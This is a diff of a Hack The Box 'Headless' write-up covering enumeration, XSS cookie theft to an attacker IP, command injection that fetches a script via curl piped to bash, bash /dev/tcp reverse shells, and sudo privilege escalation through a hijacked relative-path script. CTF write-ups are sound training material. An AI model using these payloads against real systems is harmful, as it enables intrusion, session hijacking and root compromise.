@@ -1,16 +1,16 @@
-# Machine Headless from [Hack The Box](https://www.hackthebox.com)
+# Headless machine from [Hack The Box](https://www.hackthebox.com)
 
 Target ip: 10.10.11.8
 
 ## 1) Enumeration and reconnaissance
 As always we start scanning the target with `nmap`
-```
+``` bash
 nmap -p- -sS -n -Pn -vvv --min-rate 7000 -oG open_ports 10.10.11.8
 ```
 There are **two open ports** are: 22 (SSH) and 5000.
 
 We can obtain more information on the services running on those ports using some scanning scripts from nmap with the following command
-```
+``` bash
 nmap -p22,5000 -sCV --min-rate 7000 -n -oN ports_details 10.10.11.8
 ```
 `-sC:` to run default reconnaissance scripts \
@@ -27,13 +27,14 @@ We can see that TCP port 5000 is hosting a web server so from the browser we go 
 }
 </style>
 
+
 <img src="imgs/homepage.png" alt="Home page" width="50%" height="50%" class="center-60">
 
 <img src="imgs/support.png" alt="Support page" width="80%" height="50%" class="center-60">
 
 Before playing with the form in the support page it would be interesting to do some fuzzing hoping to find more endpoints.
 
-```
+``` bash
 gobuster dir -u http://10.10.11.8:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 -x html,php,txt,py -q
 ```
 
@@ -44,7 +45,7 @@ After playing a while with the form fields I wasn't able to obtain neither XSS n
 Following the first approach on [this blog](https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e) we can try to steal cookies which may help us to bypass the security of `/dashboard`.
 
 So the idea is to add the following to some fields on the header request (using Burpsuite's repetear here)
-```
+``` bash
 <script>var i=new Image(); i.src="http://<MY-IP>/?cookie="+btoa(document.cookie);</script>
 ```
 But before sending the requests we need to open a http server:\
@@ -53,7 +54,7 @@ But before sending the requests we need to open a http server:\
 Once the requests go throw we receive, in the terminal running the python server, a cookie:
 `aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=`\
 It's base64 encoded so we decode it
-```
+``` bash
 echo "aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA=" | base64 -d
 #is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 ```
@@ -76,12 +77,12 @@ How? This is an example payload:
 ![alt text](imgs/payload.png)
 
 I'm using `curl` to read the content of a file from my machine and piping it to bash so the server executes it. The content of that `pwned.sh` is nothing else than a reverse shell
-```
+``` bash
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/<MY-IP>/434 0>&1"
 ```
 Before sending the request from Burpsuite's repeater we must start listening on the choosen port (434) and open a server to share the file
-```
+``` bash
 nc -nlvp 434
 python -m http.server 443
 ```
@@ -104,18 +105,18 @@ It happens that the user `dvir` is able to run the script `/usr/bin/syscheck` wi
 ![Scalating privilegs](imgs/scalating-priv.png)
 
 Inspecting that script we realize it's running another script called `initdb.sh` using a relative path. So we just go ahead and create our own file with the same name, the content is would be -once again, a reverse shell. And since we are going to run it as sudo, the root user is the one that would be stablishing that connection.
-```
+``` bash
 # content of initdb.sh
 #!/bin/bash
 bash -c "bash -i >& /dev/tcp/<MY-IP>/434 0>&1"
 ```
 
 From host machine we use netcat to listen on a port 
-```
+``` bash
 nc -nlvp 434
 ```
 
-```
+``` bash
 # we run the syscheck script as sudo
 sudo /usr/bin/syscheck
 ```
